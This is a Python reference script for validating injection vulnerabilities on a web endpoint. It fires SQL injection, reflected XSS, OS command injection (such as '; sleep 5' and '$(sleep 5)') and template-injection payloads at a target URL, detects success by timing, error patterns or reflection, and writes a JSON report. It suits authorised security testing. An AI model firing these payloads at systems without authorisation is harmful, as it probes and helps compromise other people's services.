#!/usr/bin/env python3
"""
Reference example: Injection validation pattern

This file is provided as a reference implementation to illustrate
how injection tests might be structured (payloads, detection, and
classification). It is NOT intended to run verbatim across apps.
Adapt to the specific application's endpoints, parameters, and context.
"""
import argparse
import hashlib
import json
import re
import time
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import quote

import requests

MAX_RESPONSE_SIZE = 8 * 1024  # 8KB response body limit

# SQL error patterns for error-based detection
SQL_ERROR_PATTERNS = [
    r"sql syntax",
    r"mysql",
    r"postgresql",
    r"oracle",
    r"unclosed quotation",
    r"quoted string not properly terminated",
    r"syntax error",
    r"ORA-\d+",
    r"PG::SyntaxError",
    r"com\.mysql\.jdbc",
    r"org\.postgresql",
    # SQLite-specific patterns
    r"sqlite",
    r"sqlite3",
    r"SQLite3::SQLException",
    r"sqlite3\.OperationalError",
    r"sqlite3\.ProgrammingError",
    r"near \".*\": syntax error",
    r"unrecognized token",
    r"no such column",
    r"no such table",
    r"SQLITE_ERROR",
    r"SELECTs to the left and right of UNION",
    r"incomplete input",
]

# Command injection error patterns
CMD_ERROR_PATTERNS = [
    r"sh: .+: not found",
    r"command not found",
    r"is not recognized as an internal or external command",
    r"/bin/sh:",
    r"syntax error near unexpected token",
]


def redact_sensitive_fields(data: Any) -> Any:
    """Redact sensitive fields from response data."""
    sensitive_keys = [
        "password",
        "passwd",
        "secret",
        "token",
        "api_key",
        "access_token",
        "refresh_token",
        "ssn",
        "credit_card",
        "cvv",
        "private_key",
        "authorization",
    ]

    if isinstance(data, dict):
        redacted = {}
        for key, value in data.items():
            if any(s in key.lower() for s in sensitive_keys):
                redacted[key] = "[REDACTED]"
            elif isinstance(value, (dict, list)):
                redacted[key] = redact_sensitive_fields(value)
            else:
                redacted[key] = value
        return redacted
    elif isinstance(data, list):
        return [redact_sensitive_fields(item) for item in data]
    return data


def truncate_and_hash(response_text: str) -> tuple:
    """Truncate response to MAX_RESPONSE_SIZE and compute hash."""
    full_hash = hashlib.sha256(response_text.encode()).hexdigest()
    truncated = response_text[:MAX_RESPONSE_SIZE]

    metadata = {
        "truncated": len(response_text) > MAX_RESPONSE_SIZE,
        "original_size_bytes": len(response_text),
    }

    return truncated, f"sha256:{full_hash}", metadata


def has_sql_errors(content: str) -> bool:
    """Check if response contains SQL error indicators."""
    content_lower = content.lower()
    for pattern in SQL_ERROR_PATTERNS:
        if re.search(pattern, content_lower, re.IGNORECASE):
            return True
    return False


def has_cmd_errors(content: str) -> bool:
    """Check if response contains command execution indicators."""
    for pattern in CMD_ERROR_PATTERNS:
        if re.search(pattern, content, re.IGNORECASE):
            return True
    return False


def test_time_based_sqli(
    url: str,
    param: str,
    original_value: str,
    headers: Optional[Dict] = None,
    timeout: int = 30,
    delay_threshold: float = 4.5,
) -> Dict[str, Any]:
    """
    Test for time-based SQL injection.

    Args:
        url: Target URL with parameter placeholder
        param: Parameter name to inject
        original_value: Original parameter value
        headers: Optional request headers
        timeout: Request timeout in seconds
        delay_threshold: Minimum delay to confirm injection (default: 4.5s)

    Returns:
        Test result dictionary with status and evidence
    """
    payloads = [
        f"{original_value}' OR SLEEP(5)--",
        f"{original_value}'; SELECT pg_sleep(5)--",
        f"{original_value}'; WAITFOR DELAY '0:0:5'--",
    ]

    # Baseline request
    try:
        baseline_start = time.time()
        baseline_url = f"{url}?{param}={quote(original_value)}"
        baseline_resp = requests.get(baseline_url, headers=headers, timeout=timeout)
        baseline_time = time.time() - baseline_start
    except requests.RequestException as e:
        return {
            "status": "UNVALIDATED",
            "reason": f"Baseline request failed: {str(e)}",
            "evidence": None,
        }

    baseline_snippet, baseline_hash, baseline_meta = truncate_and_hash(baseline_resp.text)

    baseline = {
        "url": baseline_url,
        "method": "GET",
        "status": baseline_resp.status_code,
        "response_time_seconds": round(baseline_time, 3),
        "response_hash": baseline_hash,
        **baseline_meta,
    }

    # Test each payload
    for payload in payloads:
        try:
            test_start = time.time()
            test_url = f"{url}?{param}={quote(payload)}"
            test_resp = requests.get(test_url, headers=headers, timeout=timeout + 10)
            test_time = time.time() - test_start
        except requests.Timeout:
            # Timeout could indicate successful delay
            test_time = timeout + 10
            test_resp = None
        except requests.RequestException:
            continue

        test_snippet, test_hash, test_meta = truncate_and_hash(test_resp.text if test_resp else "")

        test = {
            "url": test_url,
            "method": "GET",
            "status": test_resp.status_code if test_resp else None,
            "response_time_seconds": round(test_time, 3),
            "response_hash": test_hash,
            **test_meta,
        }

        delay = test_time - baseline_time

        if delay >= delay_threshold:
            return {
                "status": "VALIDATED",
                "injection_type": "sql_injection_time_based",
                "cwe": "CWE-89",
                "baseline": baseline,
                "test": test,
                "evidence": f"Time-based SQLi: {delay:.2f}s delay with payload",
                "payload_used": payload,
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "sql_injection",
        "baseline": baseline,
        "evidence": "No significant time delay detected",
    }


def test_error_based_sqli(
    url: str,
    param: str,
    original_value: str,
    headers: Optional[Dict] = None,
    timeout: int = 30,
) -> Dict[str, Any]:
    """
    Test for error-based SQL injection.

    Returns:
        Test result dictionary with status and evidence
    """
    payloads = ["'", '"', "`", "1'1", "1 AND 1=CONVERT(int,'a')--"]

    # Baseline request
    try:
        baseline_url = f"{url}?{param}={quote(original_value)}"
        baseline_resp = requests.get(baseline_url, headers=headers, timeout=timeout)
    except requests.RequestException as e:
        return {
            "status": "UNVALIDATED",
            "reason": f"Baseline request failed: {str(e)}",
            "evidence": None,
        }

    baseline_snippet, baseline_hash, baseline_meta = truncate_and_hash(baseline_resp.text)

    baseline = {
        "url": baseline_url,
        "method": "GET",
        "status": baseline_resp.status_code,
        "response_snippet": baseline_snippet[:500],
        "response_hash": baseline_hash,
        **baseline_meta,
    }

    # Test each payload
    for payload in payloads:
        try:
            test_url = f"{url}?{param}={quote(original_value + payload)}"
            test_resp = requests.get(test_url, headers=headers, timeout=timeout)
        except requests.RequestException:
            continue

        if has_sql_errors(test_resp.text):
            test_snippet, test_hash, test_meta = truncate_and_hash(test_resp.text)

            return {
                "status": "VALIDATED",
                "injection_type": "sql_injection_error_based",
                "cwe": "CWE-89",
                "baseline": baseline,
                "test": {
                    "url": test_url,
                    "method": "GET",
                    "status": test_resp.status_code,
                    "response_snippet": test_snippet[:500],
                    "response_hash": test_hash,
                    **test_meta,
                },
                "evidence": "Error-based SQLi: SQL error in response",
                "payload_used": original_value + payload,
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "sql_injection",
        "baseline": baseline,
        "evidence": "No SQL errors detected in response",
    }


def test_boolean_based_sqli(
    url: str,
    param: str,
    original_value: str,
    headers: Optional[Dict] = None,
    timeout: int = 30,
) -> Dict[str, Any]:
    """
    Test for boolean-based SQL injection (works well with SQLite).

    Compares responses between true and false conditions to detect SQLi.

    Returns:
        Test result dictionary with status and evidence
    """
    # Boolean payload pairs (true condition, false condition)
    payload_pairs = [
        ("' OR '1'='1", "' OR '1'='2"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("1' OR '1'='1", "1' AND '1'='2"),
        ("' OR 1=1 OR '1'='1", "' AND 1=2 AND '1'='1"),
        ("1 OR 1=1", "1 AND 1=2"),
    ]

    # Baseline request
    try:
        baseline_url = f"{url}?{param}={quote(original_value)}"
        baseline_resp = requests.get(baseline_url, headers=headers, timeout=timeout)
        baseline_len = len(baseline_resp.text)
    except requests.RequestException as e:
        return {
            "status": "UNVALIDATED",
            "reason": f"Baseline request failed: {str(e)}",
            "evidence": None,
        }

    baseline_snippet, baseline_hash, baseline_meta = truncate_and_hash(baseline_resp.text)

    baseline = {
        "url": baseline_url,
        "method": "GET",
        "status": baseline_resp.status_code,
        "content_length": baseline_len,
        "response_hash": baseline_hash,
        **baseline_meta,
    }

    # Test each payload pair
    for true_payload, false_payload in payload_pairs:
        try:
            # True condition request
            true_url = f"{url}?{param}={quote(original_value + true_payload)}"
            true_resp = requests.get(true_url, headers=headers, timeout=timeout)
            true_len = len(true_resp.text)

            # False condition request
            false_url = f"{url}?{param}={quote(original_value + false_payload)}"
            false_resp = requests.get(false_url, headers=headers, timeout=timeout)
            false_len = len(false_resp.text)
        except requests.RequestException:
            continue

        # Check for significant difference between true and false conditions
        len_diff = abs(true_len - false_len)
        min_diff_threshold = 50  # Minimum byte difference to consider significant

        if len_diff >= min_diff_threshold:
            true_snippet, true_hash, true_meta = truncate_and_hash(true_resp.text)
            false_snippet, false_hash, false_meta = truncate_and_hash(false_resp.text)

            return {
                "status": "VALIDATED",
                "injection_type": "sql_injection_boolean_based",
                "cwe": "CWE-89",
                "baseline": baseline,
                "test": {
                    "true_condition": {
                        "url": true_url,
                        "status": true_resp.status_code,
                        "content_length": true_len,
                        "response_hash": true_hash,
                    },
                    "false_condition": {
                        "url": false_url,
                        "status": false_resp.status_code,
                        "content_length": false_len,
                        "response_hash": false_hash,
                    },
                },
                "evidence": f"Boolean-based SQLi: {len_diff} byte difference between true/false",
                "payload_used": {"true": true_payload, "false": false_payload},
            }

        # Also check if status codes differ
        if true_resp.status_code != false_resp.status_code:
            return {
                "status": "VALIDATED",
                "injection_type": "sql_injection_boolean_based",
                "cwe": "CWE-89",
                "baseline": baseline,
                "test": {
                    "true_condition": {"url": true_url, "status": true_resp.status_code},
                    "false_condition": {"url": false_url, "status": false_resp.status_code},
                },
                "evidence": f"Boolean-based SQLi: status {true_resp.status_code} vs {false_resp.status_code}",
                "payload_used": {"true": true_payload, "false": false_payload},
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "sql_injection",
        "baseline": baseline,
        "evidence": "No significant difference between true/false conditions",
    }


def test_xss(
    url: str,
    param: str,
    headers: Optional[Dict] = None,
    timeout: int = 30,
) -> Dict[str, Any]:
    """
    Test for reflected XSS.

    Returns:
        Test result dictionary with status and evidence
    """
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        '" onmouseover="alert(1)',
    ]

    for payload in payloads:
        try:
            test_url = f"{url}?{param}={quote(payload)}"
            test_resp = requests.get(test_url, headers=headers, timeout=timeout)
        except requests.RequestException:
            continue

        # Check if payload is reflected without encoding
        if payload in test_resp.text:
            test_snippet, test_hash, test_meta = truncate_and_hash(test_resp.text)

            return {
                "status": "VALIDATED",
                "injection_type": "xss_reflected",
                "cwe": "CWE-79",
                "test": {
                    "url": test_url,
                    "method": "GET",
                    "status": test_resp.status_code,
                    "response_snippet": test_snippet[:500],
                    "response_hash": test_hash,
                    **test_meta,
                },
                "evidence": "Reflected XSS: payload in response unencoded",
                "payload_used": payload,
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "xss",
        "evidence": "Payload properly encoded or not reflected",
    }


def test_command_injection(
    url: str,
    param: str,
    original_value: str,
    headers: Optional[Dict] = None,
    timeout: int = 30,
    delay_threshold: float = 4.5,
) -> Dict[str, Any]:
    """
    Test for OS command injection.

    Returns:
        Test result dictionary with status and evidence
    """
    payloads = [
        f"{original_value}; sleep 5",
        f"{original_value}| sleep 5",
        f"{original_value}& sleep 5",
        f"{original_value}`sleep 5`",
        f"{original_value}$(sleep 5)",
    ]

    # Baseline request
    try:
        baseline_start = time.time()
        baseline_url = f"{url}?{param}={quote(original_value)}"
        baseline_resp = requests.get(baseline_url, headers=headers, timeout=timeout)
        baseline_time = time.time() - baseline_start
    except requests.RequestException as e:
        return {
            "status": "UNVALIDATED",
            "reason": f"Baseline request failed: {str(e)}",
            "evidence": None,
        }

    baseline = {
        "url": baseline_url,
        "method": "GET",
        "status": baseline_resp.status_code,
        "response_time_seconds": round(baseline_time, 3),
    }

    # Test each payload
    for payload in payloads:
        try:
            test_start = time.time()
            test_url = f"{url}?{param}={quote(payload)}"
            requests.get(test_url, headers=headers, timeout=timeout + 10)
            test_time = time.time() - test_start
        except requests.Timeout:
            test_time = timeout + 10
        except requests.RequestException:
            continue

        delay = test_time - baseline_time

        if delay >= delay_threshold:
            return {
                "status": "VALIDATED",
                "injection_type": "os_command_injection",
                "cwe": "CWE-78",
                "baseline": baseline,
                "test": {
                    "url": test_url,
                    "method": "GET",
                    "response_time_seconds": round(test_time, 3),
                },
                "evidence": f"Command injection: {delay:.2f}s delay",
                "payload_used": payload,
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "os_command_injection",
        "baseline": baseline,
        "evidence": "No significant time delay detected",
    }


def test_ssti(
    url: str,
    param: str,
    headers: Optional[Dict] = None,
    timeout: int = 30,
) -> Dict[str, Any]:
    """
    Test for Server-Side Template Injection.

    Returns:
        Test result dictionary with status and evidence
    """
    payloads = [
        ("{{7*7}}", "49", ["jinja2", "twig"]),
        ("${7*7}", "49", ["freemarker", "velocity"]),
        ("<%= 7*7 %>", "49", ["erb", "ejs"]),
        ("#{7*7}", "49", ["ruby"]),
    ]

    for payload, expected, engines in payloads:
        try:
            test_url = f"{url}?{param}={quote(payload)}"
            test_resp = requests.get(test_url, headers=headers, timeout=timeout)
        except requests.RequestException:
            continue

        if expected in test_resp.text:
            test_snippet, test_hash, test_meta = truncate_and_hash(test_resp.text)

            return {
                "status": "VALIDATED",
                "injection_type": f"ssti_{engines[0]}",
                "cwe": "CWE-1336",
                "test": {
                    "url": test_url,
                    "method": "GET",
                    "status": test_resp.status_code,
                    "response_snippet": test_snippet[:500],
                    "response_hash": test_hash,
                    **test_meta,
                },
                "evidence": f"SSTI: {payload} evaluated to {expected}",
                "payload_used": payload,
                "possible_engines": engines,
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "ssti",
        "evidence": "Template expressions not evaluated",
    }


def run_injection_tests(
    url: str,
    param: str,
    original_value: str,
    injection_types: List[str],
    headers: Optional[Dict] = None,
    timeout: int = 30,
) -> Dict[str, Any]:
    """
    Run multiple injection tests.

    Args:
        url: Target URL
        param: Parameter to test
        original_value: Original parameter value
        injection_types: List of injection types to test
        headers: Optional request headers
        timeout: Request timeout

    Returns:
        Combined results dictionary
    """
    results = {}

    test_functions = {
        "sqli_time": lambda: test_time_based_sqli(url, param, original_value, headers, timeout),
        "sqli_error": lambda: test_error_based_sqli(url, param, original_value, headers, timeout),
        "sqli_boolean": lambda: test_boolean_based_sqli(
            url, param, original_value, headers, timeout
        ),
        "xss": lambda: test_xss(url, param, headers, timeout),
        "cmdi": lambda: test_command_injection(url, param, original_value, headers, timeout),
        "ssti": lambda: test_ssti(url, param, headers, timeout),
    }

    for injection_type in injection_types:
        if injection_type in test_functions:
            results[injection_type] = test_functions[injection_type]()

    return results


def main():
    parser = argparse.ArgumentParser(description="Injection Validation Script")
    parser.add_argument("--url", required=True, help="Target URL (without params)")
    parser.add_argument("--param", required=True, help="Parameter to test")
    parser.add_argument("--value", default="1", help="Original parameter value")
    parser.add_argument(
        "--types",
        default="sqli_time,sqli_error,sqli_boolean,xss,cmdi,ssti",
        help="Comma-separated injection types (sqli_boolean recommended for SQLite)",
    )
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("--output", required=True, help="Output JSON file")
    parser.add_argument("--header", action="append", help="Headers (key:value)")

    args = parser.parse_args()

    headers = {}
    if args.header:
        for h in args.header:
            key, value = h.split(":", 1)
            headers[key.strip()] = value.strip()

    injection_types = [t.strip() for t in args.types.split(",")]

    results = run_injection_tests(
        url=args.url,
        param=args.param,
        original_value=args.value,
        injection_types=injection_types,
        headers=headers if headers else None,
        timeout=args.timeout,
    )

    # Validate output path to prevent path traversal
    output_path = Path(args.output).resolve()
    cwd = Path.cwd().resolve()
    if not output_path.is_relative_to(cwd):
        print(f"Error: Output path must be within current directory: {cwd}")
        return 1

    with open(output_path, "w") as f:
        json.dump(results, f, indent=2)

    # Summary
    validated = [k for k, v in results.items() if v.get("status") == "VALIDATED"]
    if validated:
        print(f"VALIDATED: {', '.join(validated)}")
    else:
        print("No injection vulnerabilities confirmed")

    print(f"Results saved to {output_path}")

    return 0 if not validated else 1


if __name__ == "__main__":
    exit(main())
